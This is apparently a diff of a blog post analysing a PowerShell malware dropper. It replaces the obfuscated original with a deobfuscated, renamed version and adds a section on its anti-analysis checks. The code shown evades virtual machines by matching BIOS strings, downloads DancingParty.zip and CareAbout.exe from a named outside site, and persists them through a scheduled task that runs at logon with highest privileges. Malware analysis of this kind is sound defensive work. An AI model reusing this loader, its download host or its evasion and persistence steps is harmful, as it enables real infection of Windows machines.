@@ -174,33 +174,96 @@ Start-Process 'cmd.exe'
 {% endhighlight %} 
 
 <br>
-In the above code, we note that $payload_str is executed by the powershell interpreter. To extract the contents of `$payload_str`, simply run the code in powershell and print `$payload_str`
+In the above code, we note that $payload_str is executed by the powershell interpreter. To extract the contents of `$payload_str`, simply run the code in powershell and print `$payload_str`. Below is the result after manual tidying and renaming.
 
 {% highlight powershell %}
 
-function CYX($xRP, $vBO){[IO.File]::WriteAllBytes($xRP, $vBO)};function Mne($xRP){if ($xRP.E
-ndsWith('.zip') -eq $True){$fwef = '\' + (Get-Item $xRP).Basename; $Script:fghrth = Join-Pat
-h $OHX $fwef;Expand-Archive -Path $xRP -DestinationPath $fghrth; $Script:ghyth = 1; del $xRP
-}else{if ($ghyth -eq 1){mv -Path $xRP -Destination $fghrth; $xRP = Join-Path $fghrth CareAbo
-ut.exe};$Action = (New-ScheduledTaskAction -Execute $xRP);$Trigger = New-ScheduledTaskTrigge
-r -AtLogOn;Register-ScheduledTask -TaskName "BackgroundCheck" -Action $Action -Trigger $Trig
-ger -RunLevel "Highest" -Force;Start $xRP}};function WkR($BCl){$Ijq = New-Object (rbH @(6813
-,6836,6851,6781,6822,6836,6833,6802,6843,6840,6836,6845,6851));[Net.ServicePointManager]::Se
-curityProtocol = [Net.SecurityProtocolType]::TLS12;$vBO = $Ijq.DownloadData($BCl);return $vB
-O};function rbH($rHG){$pef=6735;$NMd=$Null;foreach($pPr in $rHG){$NMd+=[char]($pPr-$pef)};re
-turn $NMd};function ABi(){$OHX = $env:AppData + '\';;;$Uusz = @("VirtualBox", "VMware", "Xen
-", "Bochs","Qemu", "Hyper", "VRTUAL", "Virt", "A M I");$hOzHg = Get-WmiObject Win32_Bios | S
-elect-Object -Property * | Out-String; foreach($bLFGl in $Uusz) {$omfXU = Select-String -Pat
-tern $bLFGl -Input $hOzHg -AllMatches -Quiet;if($omfXU -eq $True) {Exit}};$pvSx = $OHX + 'Da
-ncingParty.zip'; if (Test-Path -Path $pvSx){Mne $pvSx;}Else{ $huPZk = WkR (rbH @(6839,6851,6
-851,6847,6850,6793,6782,6782,6844,6846,6846,6835,6840,6780,6854,6846,6846,6835,6781,6834,684
-6,6844,6782,6854,6847,6780,6834,6846,6845,6851,6836,6845,6851,6782,6852,6847,6843,6846,6832,
-6835,6850,6782,6832,6850,6851,6849,6832,6782,6803,6832,6845,6834,6840,6845,6838,6815,6832,68
-49,6851,6856,6781,6857,6840,6847));CYX $pvSx $huPZk;Mne $pvSx;}$OSoh = $OHX + 'CareAbout.exe
-'; if (Test-Path -Path $OSoh){Mne $OSoh;}Else{ $GOuVJ = WkR (rbH @(6839,6851,6851,6847,6850,
-6793,6782,6782,6844,6846,6846,6835,6840,6780,6854,6846,6846,6835,6781,6834,6846,6844,6782,68
-54,6847,6780,6834,6846,6845,6851,6836,6845,6851,6782,6852,6847,6843,6846,6832,6835,6850,6782
-,6832,6850,6851,6849,6832,6782,6802,6832,6849,6836,6800,6833,6846,6852,6851,6781,6836,6855,6
-836));CYX $OSoh $GOuVJ;Mne $OSoh;};;}ABi;
+function func_writeToFile($filepath, $fileBytes) {
+    [IO.File]::WriteAllBytes($filepath, $fileBytes)
+};
+
+function Mne($filepath) {
+    if ($filepath.EndsWith('.zip') -eq $True) {
+        $basename = '\' + (Get-Item $filepath).Basename; 
+        $Script:basePath = Join-Path $appdataDir $basename;
+        Expand-Archive -Path $filepath -DestinationPath $basePath; 
+        $Script:decompressed = 1; 
+        del $filepath
+    } else { 
+        if ($decompressed -eq 1) { 
+            mv -Path $filepath -Destination $basePath; 
+            $filepath = Join-Path $basePath CareAbout.exe
+        };
+        $Action = (New-ScheduledTaskAction -Execute $filepath);
+        $Trigger = New-ScheduledTaskTrigger -AtLogOn;
+        Register-ScheduledTask -TaskName "BackgroundCheck" -Action $Action -Trigger $Trigger -RunLevel "Highest" -Force;Start $filepath
+    }
+};
+    
+function func_downloadBytes($BCl) {
+    $objWebClient = New-Object ("Net.WebClient");
+    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::TLS12;
+    $fileBytes = $objWebClient.DownloadData($BCl);
+    return $fileBytes
+};
+
+function func_decode($rHG) {
+    $pef=6735;
+    $NMd=$Null;
+    foreach($pPr in $rHG) {
+        $NMd+=[char]($pPr-$pef)
+    };
+    return $NMd
+};
+
+function func_main(){
+    $appdataDir = $env:AppData + '\';
+    ;
+    ;
+    $vmStrings = @("VirtualBox", "VMware", "Xen", "Bochs","Qemu", "Hyper", "VRTUAL", "Virt", "A M I");
+    $biosProperties = Get-WmiObject Win32_Bios | Select-Object -Property * | Out-String; 
+    foreach($vmString in $vmStrings) {
+        $vmStringFound = Select-String -Pattern $vmString -Input $biosProperties -AllMatches -Quiet;
+        if($vmStringFound -eq $True) {
+            Exit
+        }
+    };
+    $pathDancingParty = $appdataDir + 'DancingParty.zip'; 
+    if (Test-Path -Path $pathDancingParty) {
+        Mne $pathDancingParty;
+    } Else { 
+        $bytesDancingParty = func_downloadBytes ("https://moodi-wood.com/wp-content/uploads/astra/DancingParty.zip");
+        func_writeToFile $pathDancingParty $bytesDancingParty;
+        Mne $pathDancingParty;
+    }
+    $pathCareAbout = $appdataDir + 'CareAbout.exe'; 
+    if (Test-Path -Path $pathCareAbout) {
+        Mne $pathCareAbout;
+    } Else { 
+        $bytesCareAbout = func_downloadBytes ("https://moodi-wood.com/wp-content/uploads/astra/CareAbout.exe");
+        func_writeToFile $pathCareAbout $bytesCareAbout;
+        Mne $pathCareAbout;
+    };
+;
+}
+
+func_main;
+
+{% endhighlight %}
+
+<br>
+#### 3.4. Anti-Analysis
+The powershell process prematurely exits if detected within a virtualized environment. It performs this check by looking for the following strings in the host's BIOS properties - `VirtualBox`, `VMware`, `Xen`, `Bochs`, `Qemu`, `Hyper`, `VRTUAL`, `Virt`, `A M I`.
+
+{% highlight powershell %}
+
+$vmStrings = @("VirtualBox", "VMware", "Xen", "Bochs","Qemu", "Hyper", "VRTUAL", "Virt", "A M I");
+    $biosProperties = Get-WmiObject Win32_Bios | Select-Object -Property * | Out-String; 
+    foreach($vmString in $vmStrings) {
+        $vmStringFound = Select-String -Pattern $vmString -Input $biosProperties -AllMatches -Quiet;
+        if($vmStringFound -eq $True) {
+            Exit
+        }
+    };
 
 {% endhighlight %}
